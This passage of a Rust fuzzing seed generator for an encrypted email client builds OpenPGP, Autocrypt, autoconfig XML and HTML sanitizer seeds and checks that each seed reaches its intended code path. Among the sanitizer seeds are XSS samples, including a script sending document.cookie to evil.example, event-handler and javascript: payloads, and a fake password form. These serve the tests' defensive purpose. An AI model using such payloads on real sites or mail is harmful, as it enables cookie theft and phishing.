            RAW,
            &cheap_envelope(body, false, Some(CompressionAlgorithm::ZLIB), true)?,
        ),
    ));
    seeds.push((
        "raw-cheap-v2-bzip2-two-skesk.pgp".into(),
        moded(
            RAW,
            &cheap_envelope(body, true, Some(CompressionAlgorithm::BZip2), true)?,
        ),
    ));

    // WRAP_V1 / WRAP_V2: plaintext packet streams
    let literal = inner_stream(body, &[], None, false, None)?;
    let zlib = inner_stream(body, &[], Some(CompressionAlgorithm::ZLIB), false, None)?;
    let signed = inner_stream(body, &[&k.peer_raw], None, false, None)?;
    for (name, s) in [("literal", &literal), ("zlib", &zlib), ("signed", &signed)] {
        seeds.push((format!("wrap-v1-{name}.bin"), moded(WRAP_V1, s)));
        seeds.push((format!("wrap-v2-{name}.bin"), moded(WRAP_V2, s)));
    }

    // SETUP_MESSAGE: Autocrypt Setup Message bodies (Level 1 §4.4), bare and as the
    // attachment text a client shows around the armor
    let setup = setup_message_create(&k.identity, SETUP_CODE)?;
    seeds.push((
        "setup-message-bare.txt".into(),
        moded(SETUP_MESSAGE, setup.as_bytes()),
    ));
    let html = format!(
        "<html><body><p>This message contains all information to transfer your Autocrypt \
         settings along with your secret key securely from your original device.</p>\
         <pre>\r\n{setup}\r\n</pre></body></html>\r\n"
    );
    seeds.push((
        "setup-message-attachment.html".into(),
        moded(SETUP_MESSAGE, html.as_bytes()),
    ));
    write_seeds(dir, &seeds)
}

// ------------------------------------------------------------------------------------------
// autodiscover_xml

fn autoconfig_seeds(dir: &Path, samples: &Path) -> Result<usize> {
    let mut seeds: Vec<(String, Vec<u8>)> = Vec::new();
    let mut real: Vec<PathBuf> = fs::read_dir(samples)
        .with_context(|| format!("reading {}", samples.display()))?
        .filter_map(|e| e.ok().map(|e| e.path()))
        .filter(|p| p.extension().is_some_and(|x| x == "xml"))
        .collect();
    real.sort();
    for p in real {
        let name = p
            .file_name()
            .and_then(|n| n.to_str())
            .context("sample file name")?
            .to_owned();
        seeds.push((name, fs::read(&p)?));
    }
    for (name, text) in HANDWRITTEN_XML {
        seeds.push(((*name).into(), text.as_bytes().to_vec()));
    }
    write_seeds(dir, &seeds)
}

const HANDWRITTEN_XML: &[(&str, &str)] = &[
    (
        "edge-minimal.xml",
        "<clientConfig version=\"1.1\"><emailProvider id=\"m\"><incomingServer type=\"imap\">\
         <hostname>imap.example.com</hostname><port>143</port><socketType>STARTTLS</socketType>\
         <username>%EMAILLOCALPART%</username><authentication>password-cleartext</authentication>\
         </incomingServer><outgoingServer type=\"smtp\"><hostname>smtp.example.com</hostname>\
         <port>587</port><socketType>STARTTLS</socketType></outgoingServer></emailProvider>\
         </clientConfig>",
    ),
    (
        "edge-namespaces-entities-cdata.xml",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- comment -->\n\
         <cc:clientConfig xmlns:cc=\"urn:x\" version=\"1.1\"><cc:emailProvider id=\"e\">\
         <cc:displayName>A &amp; B &#x263A; &lt;mail&gt;</cc:displayName>\
         <cc:incomingServer type=\"IMAP\"><cc:hostname><![CDATA[imap.example.com]]></cc:hostname>\
         <cc:port> 993 </cc:port><cc:socketType>ssl</cc:socketType>\
         <cc:authentication>OAuth2</cc:authentication></cc:incomingServer>\
         <cc:outgoingServer type=\"smtp\"><cc:hostname>smtp.example.com</cc:hostname>\
         <cc:port>465</cc:port><cc:socketType>TLS</cc:socketType></cc:outgoingServer>\
         </cc:emailProvider><cc:enable visiturl=\"https://example.com/app-passwords?a=1&amp;b=2\"/>\
         <?pi data?></cc:clientConfig>",
    ),
    (
        "edge-ranked-servers.xml",
        "<clientConfig version=\"1.1\"><emailProvider id=\"r\">\
         <incomingServer type=\"imap\"><hostname>plain.example.com</hostname><port>143</port>\
         <socketType>plain</socketType></incomingServer>\
         <incomingServer type=\"imap\"><hostname>tls.example.com</hostname><port>993</port>\
         <socketType>SSL</socketType></incomingServer>\
         <incomingServer type=\"imap\"><hostname>bad.example.com</hostname><port>99999</port>\
         <socketType>SSL</socketType></incomingServer>\
         <outgoingServer type=\"smtp\"><hostname>smtp.office365.com</hostname><port>587</port>\
         <socketType>STARTTLS</socketType><authentication>OAuth2</authentication></outgoingServer>\
         </emailProvider></clientConfig>",
    ),
    (
        "edge-mismatched-close.xml",
        "<clientConfig><emailProvider><incomingServer type=\"imap\"><hostname>x</port>\
         </incomingServer></emailProvider></clientConfig>",
    ),
];

// ------------------------------------------------------------------------------------------
// html_sanitize

/// Seeds for the display sanitizer. The name says which path the seed must reach, which
/// `--check` then verifies: `remote-` has remote images, `drop-` loses an element with its
/// content, `keep-` keeps formatting, `broken-` is malformed but still sanitizes.
fn html_seeds(dir: &Path) -> Result<usize> {
    let seeds: Vec<(String, Vec<u8>)> = HTML_SEEDS
        .iter()
        .map(|(name, mode, html)| ((*name).to_owned(), moded(*mode, html.as_bytes())))
        .collect();
    write_seeds(dir, &seeds)
}

/// `(file name, mode byte, document)`. Mode `b'0'` is even → remote content blocked, `b'1'`
/// odd → allowed (`fuzz_targets/html_sanitize.rs`).
const HTML_SEEDS: &[(&str, u8, &str)] = &[
    (
        "keep-newsletter.html",
        b'0',
        "<html><head><title>News</title><style>body{color:#333}</style></head><body>\
         <table width=\"600\" align=\"center\"><tr><td style=\"padding:12px\">\
         <h1>Monthly news</h1><p>Hello <b>subscriber</b>, see our \
         <a href=\"https://example.com/offers?id=42&amp;src=mail\" target=\"_blank\">offers</a>.</p>\
         <ul><li>One</li><li>Two</li></ul><blockquote>Quoted</blockquote>\
         <img src=\"https://cdn.example.com/banner.png\" alt=\"Banner\" width=\"600\" height=\"120\">\
         <p><small>Unsubscribe <a href=\"https://example.com/u/abc\">here</a>.</small></p>\
         </td></tr></table></body></html>",
    ),
    (
        "keep-reply-quote.html",
        b'1',
        "<div dir=\"ltr\">My answer.</div><br><blockquote class=\"gmail_quote\" \
         style=\"margin:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex\">\
         <div>On Tue, Alice wrote:</div><div>Original <i>text</i> with \
         <a href=\"mailto:alice@example.com\">alice@example.com</a>.</div></blockquote>",
    ),
    (
        "keep-cid-and-data-images.html",
        b'0',
        "<p><img src=\"cid:logo.1@example.com\" alt=\"Logo\" width=\"80\">\
         <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ\
AAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==\" alt=\"dot\"></p>\
         <table><thead><tr><th>h</th></tr></thead><tbody><tr><td>c</td></tr></tbody></table>",
    ),
    (
        "remote-images-and-pixel.html",
        b'0',
        "<p>Pictures:</p><img src=\"https://a.example/one.png\" alt=\"one\">\
         <img src=\"http://b.example/two.gif\"><img src=\"https://t.example/p.gif\" width=\"1\" height=\"1\">\
         <div style=\"display:none\">preheader <img src=\"https://t.example/h.png\"></div>",
    ),
    (
        "remote-images-allowed.html",
        b'1',
        "<img src=\"https://a.example/one.png\" alt=\"one\"><img src=\"https://b.example/two.png\">",
    ),
    (
        "drop-script-and-handlers.html",
        b'0',
        "<p onclick=\"steal()\">Hi<script>fetch('https://evil.example/'+document.cookie)</script></p>\
         <img src=\"x\" onerror=\"alert(1)\"><svg onload=\"alert(2)\"><circle r=\"1\"></svg>\
         <iframe src=\"https://evil.example/\"></iframe><object data=\"x.swf\"></object>",
    ),
    (
        "drop-javascript-links.html",
        b'1',
        "<a href=\"javascript:alert(1)\">one</a><a href=\"jav&#x61;script:alert(2)\">two</a>\
         <a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">three</a>\
         <a href=\"https://ok.example/\">four</a>",
    ),
    (
        "drop-form-base-meta.html",
        b'0',
        "<base href=\"https://evil.example/\"><meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">\
         <form action=\"https://evil.example/\"><input name=\"password\" type=\"password\">\
         <button type=\"submit\">Sign in</button></form><p>Please sign in.</p>",
    ),
    (
        "broken-truncated.html",
        b'0',
        "<table><tr><td>cell<td>other<tr><td>second row<p>unclosed <b>bold <i>italic \
         <a href=\"https://x.example/",
    ),
    (
        "broken-misnested-entities.html",
        b'1',
        "</div></p><b><i>mis</b>nested</i><p>&amp;&lt;&gt;&nbsp;&#x1F600;&unknown; \
         <span>a<<<>>>b</span><pre>  spaced\n   lines</pre>",
    ),
];

// ------------------------------------------------------------------------------------------
// --check: every seed must reach the success path it was made for

/// Replays every committed seed through the code the harness runs (same fixtures, same
/// wrapped containers) and fails if a seed no longer decrypts / verifies / parses the way its
/// name promises. Without this a fuzz run over stale seeds (say, regenerated keys) would still
/// "pass" while exercising nothing but early error paths.
mod check {
    use std::fs;
    use std::path::Path;

    use anyhow::{bail, ensure, Context, Result};
    use sealbox_crypto::{
        decrypt_and_verify, guest_decrypt_bytes, setup_message_open, verify_detached,
        AutocryptGossip, AutocryptHeader, Decrypted, Error, Identity, PublicKey, SignatureStatus,
    };
    use sealbox_mail::mime::{self, MessageKind};

    use crate::fixtures::{split_mode, Fixtures};
    use crate::params::*;

    pub fn run(seeds: &Path) -> Result<()> {
        let keys = seeds.join("keys");
        let read =
            |f: &str| fs::read_to_string(keys.join(f)).with_context(|| format!("reading keys/{f}"));
        let fx = Fixtures::from_armored(
            &read(IDENTITY_SECRET_FILE)?,
            &read(IDENTITY_V6_SECRET_FILE)?,
            &read(PEER_PUBLIC_FILE)?,
        )
        .map_err(anyhow::Error::msg)?;
        let mut n = 0;
        n += each(&seeds.join("pgp_decrypt"), |name, data| {
            pgp(&fx, name, data)
        })?;
        n += each(&seeds.join("guest_decrypt"), |name, data| {
            guest(&fx, name, data)
        })?;
        n += each(&seeds.join("autocrypt_header"), autocrypt)?;
        n += each(&seeds.join("mime_parse"), |name, data| {
            mime_seed(&fx, name, data)
        })?;
        n += each(&seeds.join("autodiscover_xml"), autoconfig)?;
        n += each(&seeds.join("html_sanitize"), html_seed)?;
        println!("seedgen --check: all {n} seeds reach their intended path");
        Ok(())
    }

    fn each(dir: &Path, mut f: impl FnMut(&str, &[u8]) -> Result<()>) -> Result<usize> {
        let mut names: Vec<String> = fs::read_dir(dir)
            .with_context(|| format!("reading {}", dir.display()))?
            .filter_map(|e| e.ok()?.file_name().into_string().ok())
            .collect();
        names.sort();
        ensure!(
            names.len() >= 5,
            "{}: only {} seeds",
            dir.display(),
            names.len()
        );
        for name in &names {
            let data = fs::read(dir.join(name))?;
            f(name, &data).with_context(|| format!("seed {}/{name}", dir.display()))?;
        }
        Ok(names.len())
    }

    fn signatures_as_named(name: &str, d: &Decrypted) -> Result<()> {
        let s = &d.signatures;
        if name.contains("unknown") {
            ensure!(
                !s.is_empty()
                    && s.iter()
                        .all(|x| matches!(x, SignatureStatus::UnknownKey { .. })),
                "expected only unknown-key signatures, got {s:?}"
            );
        } else if name.contains("signed") && !name.contains("unsigned") {
            ensure!(
                d.signed_by_known_key(),
                "expected a good signature, got {s:?}"
            );
            if name.contains("peer-and-identity") {
                ensure!(s.len() == 2, "expected two signatures, got {s:?}");
            }
        } else {
            ensure!(s.is_empty(), "expected no signature, got {s:?}");
        }
        Ok(())
    }

    fn pgp(fx: &Fixtures, name: &str, data: &[u8]) -> Result<()> {
        let (mode, payload) = split_mode(data, 4);
        let dec = fx.decryptors();
        let known = fx.known_signers();
        match mode {
            pgp_mode::RAW => match decrypt_and_verify(payload, &dec, &known) {
                Err(Error::NoDecryptionKey) if name.contains("not-for-us") => Ok(()),
                Err(Error::NotEncrypted) if name.contains("not-encrypted") => Ok(()),
                Ok(d) if !name.contains("not-") => signatures_as_named(name, &d),
                other => bail!("unexpected result {other:?}"),
            },
            pgp_mode::WRAP_V1 | pgp_mode::WRAP_V2 => {
                let msg = if mode == pgp_mode::WRAP_V1 {
                    fx.wrap_pkesk_seipd_v1(payload)
                } else {
                    fx.wrap_pkesk_seipd_v2(payload)
                }
                .context("wrapping")?;
                let d = decrypt_and_verify(&msg, &dec, &known)?;
                ensure!(!d.plaintext.is_empty(), "empty plaintext");
                signatures_as_named(name, &d)
            }
            _ => {
                let s = verify_detached(DETACHED_SIGNED_DATA, payload, &known)?;
                if name.contains("unknown") {
                    ensure!(
                        matches!(s[..], [SignatureStatus::UnknownKey { .. }]),
                        "{s:?}"
                    );
                } else {
                    ensure!(
                        s.iter().all(|x| matches!(x, SignatureStatus::Good { .. })),
                        "{s:?}"
                    );
                    ensure!(s.len() == if name.contains("two") { 2 } else { 1 }, "{s:?}");
                }
                Ok(())
            }
        }
    }

    fn guest(fx: &Fixtures, name: &str, data: &[u8]) -> Result<()> {
        let (mode, payload) = split_mode(data, 4);
        let plain = match mode {
            guest_mode::RAW => guest_decrypt_bytes(payload, GUEST_PASSPHRASE)?,
            guest_mode::WRAP_V1 => guest_decrypt_bytes(
                &fx.wrap_skesk_seipd_v1(payload).context("wrapping")?,
                GUEST_PASSPHRASE,
            )?,
            guest_mode::WRAP_V2 => guest_decrypt_bytes(
                &fx.wrap_skesk_seipd_v2(payload).context("wrapping")?,
                GUEST_PASSPHRASE,
            )?,
            _ => {
                let id = setup_message_open(&String::from_utf8_lossy(payload), SETUP_CODE)?;
                ensure!(
                    id.fingerprint() == fx.identity.fingerprint(),
                    "setup message carries another key"
                );
                return Ok(());
            }
        };
        ensure!(!plain.is_empty(), "{name}: empty plaintext");
        Ok(())
    }

    fn autocrypt(name: &str, data: &[u8]) -> Result<()> {
        let (mode, payload) = split_mode(data, 3);
        let text = String::from_utf8_lossy(payload);
        match mode {
            autocrypt_mode::HEADER => {
                let h = AutocryptHeader::parse(&text)?;
                ensure!(
                    mime::parse_autocrypt_header(&text).is_some(),
                    "sealbox-mail's parser rejects it"
                );
                h.public_key()?;
            }
            autocrypt_mode::GOSSIP => {
                AutocryptGossip::parse(&text)?.public_key()?;
            }
            _ if name.contains("secret") => {
                Identity::from_secret_bytes(payload, None)?;
            }
            _ => {
                PublicKey::from_bytes(payload)?;
            }
        }
        Ok(())
    }

    fn mime_seed(fx: &Fixtures, name: &str, data: &[u8]) -> Result<()> {
        let dec = fx.decryptors();
        let known = fx.known_signers();
        if name.starts_with("inner-") {
            let inner = mime::parse_decrypted_inner(data)?;
            ensure!(inner.headers.present, "protected headers not recognised");
            ensure!(
                !inner.headers.autocrypt_gossip.is_empty(),
                "gossip not found"
            );
            return Ok(());
        }
        let msg = mime::parse(data)?;
        match (&msg.kind, name) {
            (MessageKind::PgpMimeEncrypted { ciphertext }, n)
                if n.starts_with("pgp-mime-encrypted") =>
            {
                let d = decrypt_and_verify(ciphertext, &dec, &known)?;
                ensure!(d.signed_by_known_key(), "{:?}", d.signatures);
                let inner = mime::parse_decrypted_inner(&d.plaintext)?;
                ensure!(inner.headers.present, "protected headers not recognised");
            }
            (
                MessageKind::PgpMimeSigned {
                    signed_part,
                    signature,
                    ..
                },
                "pgp-mime-signed.eml",
            ) => {
                let s = verify_detached(signed_part, signature, &known)?;
                ensure!(matches!(s[..], [SignatureStatus::Good { .. }]), "{s:?}");
            }
            (MessageKind::InlinePgp { armored }, "inline-pgp-encrypted.eml") => {
                ensure!(decrypt_and_verify(armored.as_bytes(), &dec, &known)?.signed_by_known_key());
            }
            (MessageKind::InlinePgp { armored }, "inline-pgp-clearsigned.eml") => {
                ensure!(armored.starts_with("-----BEGIN PGP SIGNED MESSAGE-----"));
            }
            (MessageKind::PgpMimeSigned { .. }, "lf-only-signed.eml")
            | (MessageKind::PgpMimeEncrypted { .. }, "encrypted-unterminated-padding.eml")
            | (MessageKind::Plain(_), _) => {}
            (kind, _) => bail!("classified as {kind:?}"),
        }
        // seeds whose outer headers carry the peer's Autocrypt header (as the send path adds it)
        const WITH_AUTOCRYPT: &[&str] = &[
            "plain-autocrypt.eml",
            "pgp-mime-encrypted.eml",
            "pgp-mime-encrypted-gateway-wrapped.eml",
            "pgp-mime-signed.eml",
        ];
        if WITH_AUTOCRYPT.contains(&name) {
            let from = msg.headers.from.first().context("no From")?;
            let values: Vec<&str> = msg.headers.autocrypt.iter().map(String::as_str).collect();
            ensure!(
                AutocryptHeader::parse_for_sender(&values, &from.address).is_some(),
                "Autocrypt header not accepted"
            );
        }
        Ok(())
    }

    /// An `html_sanitize` seed must still reach the behaviour its name promises, and the
    /// sanitizer's contract must hold on it (the harness asserts the same invariants).
    fn html_seed(name: &str, data: &[u8]) -> Result<()> {
        use sealbox_mail::html::{audit_safe_html, html_to_text, sanitize, RemoteContent};

        let (mode, payload) = split_mode(data, 2);
        let remote = if mode % 2 == 0 {
            RemoteContent::Blocked
        } else {
            RemoteContent::Allowed
        };
        let input = std::str::from_utf8(payload).context("seed is not UTF-8")?;
        let out = sanitize(input, remote);
        audit_safe_html(&out.html).map_err(anyhow::Error::msg)?;
        ensure!(
            sanitize(&out.html, remote).html == out.html,
            "not idempotent: {:?}",
            out.html
        );
        let other = match remote {
            RemoteContent::Blocked => RemoteContent::Allowed,
            RemoteContent::Allowed => RemoteContent::Blocked,
        };
        ensure!(
            sanitize(input, other).remote_images == out.remote_images,
            "remote count depends on the mode"
        );
        let text = html_to_text(input);
        if name.starts_with("remote-") {
            ensure!(out.remote_images > 0, "no remote image in a remote- seed");
            match remote {
                RemoteContent::Blocked => ensure!(
                    out.html.contains("sealbox-blocked-image")
                        && !out.html.contains("<img src=\"http"),
                    "remote image not blocked: {:?}",
                    out.html
                ),
                RemoteContent::Allowed => ensure!(
                    out.html.contains("<img src=\"http"),
                    "remote image not kept: {:?}",
                    out.html
                ),
            }
        } else if name.starts_with("drop-") {
            for gone in [
                "script",
                "javascript:",
                "onerror",
                "onclick",
                "onload",
                "<form",
                "<base",
                "<iframe",
            ] {
                ensure!(!out.html.contains(gone), "{gone} survived: {:?}", out.html);
            }
            ensure!(!out.html.is_empty(), "nothing left at all");
        } else if name.starts_with("keep-") {
            ensure!(out.html.contains('<'), "no markup survived: {:?}", out.html);
            ensure!(text.len() > 10, "no text: {text:?}");
        } else {
            // broken-*: the point is that malformed input still sanitizes to something safe
            ensure!(name.starts_with("broken-"), "unknown seed prefix");
        }
        Ok(())
    }

    fn autoconfig(name: &str, data: &[u8]) -> Result<()> {
        let parsed = sealbox_mail::autodiscover::parse_autoconfig_xml(
            &String::from_utf8_lossy(data),
            AUTOCONFIG_DOMAIN,
        );
        match (name, parsed) {
            // error-path seeds: a mismatched end tag, and a CDATA hostname (not supported)
            ("edge-mismatched-close.xml" | "edge-namespaces-entities-cdata.xml", Err(_)) => Ok(()),
            (n, Ok(cfg)) if !n.starts_with("edge-mismatched") && !n.contains("cdata") => {
                ensure!(cfg.imap.port != 0 && !cfg.imap.host.is_empty(), "{cfg:?}");
                Ok(())
            }
            (_, other) => bail!("unexpected result {other:?}"),
        }
    }
}
